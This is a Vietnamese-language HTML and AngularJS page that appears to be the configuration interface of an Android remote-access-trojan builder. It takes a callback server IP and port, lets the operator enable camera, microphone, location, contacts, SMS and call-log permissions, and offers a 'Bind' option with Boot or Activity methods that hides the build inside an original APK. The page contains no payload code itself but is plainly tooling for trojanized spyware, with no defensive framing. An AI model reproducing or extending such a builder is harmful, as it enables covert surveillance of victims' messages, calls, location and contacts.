<!DOCTYPE html>
<html lang="vi" class="h-full">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Thiết lập APK</title>
        <!-- Semantic UI & Font Awesome (CDN) -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.5.0/dist/semantic.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">
        <style>
    :root{
      --bg: #0b0f14;
      --card: #121824;
      --muted: #9fb0c3;
      --text: #e8f0ff;
      --primary: #42b883;
      --primary-2: #2aa876;
      --accent: #8ab4ff;
      --danger: #ff6b6b;
      --warn: #ffb86b;
      --ring: rgba(66,184,131,.35);
      --border: rgba(255,255,255,.08);
    }

    html,body{background: var(--bg); color: var(--text);}
    *{box-sizing: border-box}

    /* Wrapper */
    .page-wrap{
      max-width: 1080px;
      margin:  auto;
      padding: 0px;
      animation: fadeIn .3s ease-out;
    }
    @keyframes fadeIn{from{opacity:0; transform: translateY(6px)} to{opacity:1; transform:none}}

    /* Card / Section */
    .section-card{
      background: linear-gradient(180deg, rgba(255,255,255,.02), transparent 60%) , var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 18px;
      position: relative;
      box-shadow: 0 10px 30px rgba(0,0,0,.35);
    }
    .section-title{
      display:flex; align-items:center; gap:10px;
      font-size: 16px; font-weight: 700; letter-spacing:.2px;
      margin: 0 0 14px 0; color: var(--text);
    }
    .section-title .badge{
      font-size: 11px; font-weight: 600; color: var(--accent);
      background: rgba(138,180,255,.12); padding: 2px 8px; border-radius: 999px;
      border: 1px solid rgba(138,180,255,.25);
    }
    .title-icon{
      width: 26px; height:26px; display:grid; place-items:center;
      border-radius: 8px; background: rgba(66,184,131,.15); color: var(--primary);
      border: 1px solid rgba(66,184,131,.25);
    }

    /* Inputs */
    .ui.form .field > label{
      color: var(--muted)!important; font-weight: 700!important; letter-spacing:.2px;
    }
    .ui.input>input,
    .ui.dropdown,
    .ui.search.selection.dropdown{
      background: #0e141f!important; color: var(--text)!important;
      border: 1px solid var(--border)!important; border-radius: 12px!important;
      transition: all .18s ease;
    }
    .ui.input>input:focus{
      border-color: var(--accent)!important; box-shadow: 0 0 0 4px rgba(138,180,255,.15)!important;
    }
    .hint{font-size: 12px; color: var(--muted); margin-top:6px}

    /* Permission grid */
    .perm-grid{
      display: grid; grid-template-columns: repeat(2, minmax(0,1fr));
      gap: 12px;
    }
    @media (min-width: 900px){ .perm-grid{grid-template-columns: repeat(3, minmax(0,1fr));} }

    .permission-box{
      border: 1px solid var(--border); border-radius: 14px; padding: 14px;
      background: #0e141f; display:flex; align-items:center; gap:12px;
      cursor: pointer; transition: transform .12s ease, box-shadow .12s ease, border-color .12s ease;
      /* user-select: none; */
    }
    .permission-box:hover{ transform: translateY(-1px); border-color: rgba(138,180,255,.35); box-shadow: 0 4px 18px rgba(0,0,0,.35);}
    .permission-box i{ font-size: 18px; width: 22px; text-align:center; }
    .permission-box label{ margin:0; color: var(--text); font-weight: 600; cursor: pointer}

    /* Toggle (bind enable) */
    .toggle{
      display:flex; align-items:center; justify-content:center; gap: 10px;
      background: #0e141f; border: 1px solid var(--border); border-radius: 999px;
      padding: 10px 14px; width: fit-content; margin: 0 auto 10px auto;
    }
    .toggle .ui.checkbox label{ color: var(--text)!important; font-weight:700; }
    .toggle .ui.checkbox input:checked~.box:before,
    .toggle .ui.checkbox input:checked~label:before{ background: var(--primary)!important; border-color: var(--primary-2)!important; }

    /* Button styles override */
    .ui.button{
      border-radius: 12px!important; font-weight: 700!important; letter-spacing:.2px;
      border: 1px solid var(--border)!important;
    }
    .ui.button.primary{
      background: linear-gradient(180deg, var(--primary), var(--primary-2))!important; color:#04110a!important; border: none!important;
    }
    .ui.button.basic{ background: #0e141f!important; color: var(--text)!important; }

    /* Radio group row */
    .radio-row{
      display:grid; grid-template-columns: 1fr auto 1fr; gap: 12px; align-items:center;
    }
    .note{ font-size: 12px; color: #ff9f9f; margin-left:8px }

    /* Divider line */
    .soft-divider{ height:1px; background: var(--border); margin: 16px 0; border-radius: 999px; }

    /* Colored chips for old background hints (optional) */
    .chip{ font-size: 11px; padding: 2px 8px; border-radius: 999px; font-weight: 700;}
    .chip.green{ color:#0b2; background: rgba(0,187,102,.12); border: 1px solid rgba(0,187,102,.35)}
    .chip.warn{ color:#f90; background: rgba(255,153,0,.12); border: 1px solid rgba(255,153,0,.35)}
        </style>
    </head>
    <body>
        <div class="page-wrap">
            <!-- GRID -->
            <div class="ui stackable two column grid">
                <!-- Left -->
                <div class="column">
                    <div class="section-card">
                        <div class="section-title">
                            <span class="title-icon">
                                <i class="fa-solid fa-gear"></i>
                            </span>
                            <span>Cấu hình APK</span>
                            <span class="badge">Server</span>
                        </div>
                        <div class="ui form">
                            <div class="two fields">
                                <!-- IP -->
                                <div class="field">
                                    <label>
                                        <i class="fas fa-globe" style="margin-right:6px"></i> Server IP
                                    </label>
                                    <div class="ui left icon input">
                                        <input
                                            ng-model="srcIP"
                                            type="text"
                                            inputmode="numeric"
                                            placeholder="188.132.xxx.xxx"
                                            pattern="^((25[0-5]|2[0-4]\d|[01]?\d?\d)(\.|$)){4}"
                                            aria-label="Địa chỉ IP máy chủ"
                                        >
                                        <i class="fas fa-network-wired icon"></i>
                                    </div>
                                    <div class="hint">Định dạng IPv4, ví dụ:
                                        <b>188.132.150.10</b>
                                    </div>
                                </div>
                                <!-- PORT -->
                                <div class="field">
                                    <label>
                                        <i class="fas fa-plug" style="margin-right:6px"></i> Server Port
                                    </label>
                                    <div class="ui left icon input">
                                        <input
                                            ng-model="srcPort"
                                            type="number"
                                            min="1025"
                                            max="65535"
                                            placeholder="mặc định 9094"
                                            aria-label="Cổng máy chủ"
                                        >
                                        <i class="fas fa-terminal icon"></i>
                                    </div>
                                    <div class="hint">Khoảng hợp lệ: 1025–65535. Mặc định:
                                        <b>9094</b>
                                    </div>
                                </div>
                            </div>
                            <div class="soft-divider"></div>
                            <!-- Quick actions -->
                            <div class="ui small buttons">
                                <button class="ui button basic" ng-click="srcIP='127.0.0.1'">
                                    <i class="fa-solid fa-bolt"></i> Localhost
                                </button>
                                <button class="ui button basic" ng-click="srcPort=9094">
                                    <i class="fa-solid fa-rotate"></i> Dùng cổng mặc định
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Right -->
                <div class="column">
                    <div class="section-card">
                        <div class="section-title">
                            <span class="title-icon" style="background: rgba(138,180,255,.12); border-color: rgba(138,180,255,.25); color: var(--accent);">
                                <i class="fa-solid fa-shield-halved"></i>
                            </span>
                            <span>Quyền tùy chỉnh</span>
                            <span class="badge">Permissions</span>
                        </div>
                        <div class="perm-grid">
                            <!-- Each item keeps the original IDs/values -->
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input
                                        type="checkbox"
                                        id="Permissions1"
                                        value="CameraPer"
                                        class="settings icon"
                                    >
                                    <label for="Permissions1">
                                        <i class="fas fa-camera"></i> Camera
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions2" value="StoragePer">
                                    <label for="Permissions2">
                                        <i class="fas fa-folder-open"></i> Bộ nhớ máy
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions3" value="MicPer">
                                    <label for="Permissions3">
                                        <i class="fas fa-microphone"></i> Micro
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions4" value="LocationPer">
                                    <label for="Permissions4">
                                        <i class="fas fa-location-dot"></i> Vị trí
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions5" value="ContactsPer">
                                    <label for="Permissions5">
                                        <i class="fas fa-address-book"></i> Danh bạ
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions6" value="SMSPer">
                                    <label for="Permissions6">
                                        <i class="fas fa-comment-dots"></i> SMS
                                    </label>
                                </div>
                            </label>
                            <label class="permission-box">
                                <div class="ui checkbox">
                                    <input type="checkbox" id="Permissions7" value="CallsLogsPer">
                                    <label for="Permissions7">
                                        <i class="fas fa-phone"></i> Nhật ký cuộc gọi
                                    </label>
                                </div>
                            </label>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Bind APK -->
            <div class="section-card" style="margin-top:16px">
                <div class="section-title" style="margin-bottom:10px">
                    <span class="title-icon" style="background: rgba(255,184,107,.16); color: var(--warn); border-color: rgba(255,184,107,.35)">
                        <i class="fa-solid fa-link"></i>
                    </span>
                    <span>Liên kết APK gốc</span>
                    <span class="badge">Bind</span>
                </div>
                <!-- Toggle enable -->
                <div class="toggle">
                    <div class="ui checkbox">
                        <input
                            type="checkbox"
                            ng-model="bindApk.enable"
                            name="bind"
                            id="toggleBind"
                        >
                        <label for="toggleBind">Bật liên kết với Apk gốc</label>
                    </div>
                </div>
                <!-- Methods + actions -->
                <div ng-hide="!bindApk.enable">
                    <div class="radio-row">
                        <!-- Boot method -->
                        <div class="ui form">
                            <div class="inline fields" style="margin:0">
                                <div class="field">
                                    <div class="ui radio checkbox">
                                        <input
                                            type="radio"
                                            name="method"
                                            checked="checked"
                                            ng-model="bindApk.method"
                                            value="BOOT"
                                            id="methodBoot"
                                        >
                                        <label for="methodBoot">
                                            <b>Boot Method</b>
                                            <span class="note">Cần khởi động lại thiết bị</span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- Browse APK -->
                        <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button">
                            <i class="android icon"></i>
                            Chọn tệp APK
                        </button>
                        <!-- Activity method -->
                        <div class="ui form">
                            <div class="inline fields" style="margin:0">
                                <div class="field">
                                    <div class="ui radio checkbox">
                                        <input
                                            type="radio"
                                            name="method"
                                            ng-model="bindApk.method"
                                            value="ACTIVITY"
                                            id="methodActivity"
                                        >
                                        <label for="methodActivity">
                                            <b>Activity Method</b>
                                            <span class="note">Không chạy trên mọi app</span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="height:10px"></div>
                </div>
                <div class="soft-divider"></div>
                <!-- Footer buttons -->
                <div style="display:flex; justify-content:center; gap:10px">
                    <!-- Build (no bind) -->
                    <button
                        ng-click="clearLogs(); Build(srcIP,srcPort)"
                        ng-hide="bindApk.enable"
                        ng-show="Build"
                        class="ui labeled icon red button"
                    >
                        <i class="hammer icon"></i>
                        Build
                    </button>
                    <!-- Bind (when enabled) -->
                    <button
                        ng-click="clearLogs(); Build(srcIP,srcPort)"
                        ng-hide="Build"
                        ng-show="bindApk.enable"
                        class="ui labeled icon primary button"
                    >
                        <i class="screwdriver icon"></i>
                        Bind
                    </button>
                </div>
            </div>
            <!-- Tips -->
            <div style="margin-top:10px; color: var(--muted); font-size:12px;">
                <span class="chip green">Mẹo</span>
                Điền IP/Port trước khi Bind/Build để tránh lỗi cấu hình.
                <span class="chip warn" style="margin-left:8px">Lưu ý</span>
                Kiểm tra quyền cần thiết tùy theo chức năng app gốc.
            </div>
        </div>
        <!-- Init Semantic checkboxes/radios (optional if Angular already handles) -->
        <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.5.0/dist/semantic.min.js"></script>
        <script>
    // Kích hoạt style cho checkbox/radio của Semantic (không ảnh hưởng Angular model)
    $(function(){
      $('.ui.checkbox').checkbox();
    });
        </script>
    </body>
</html>
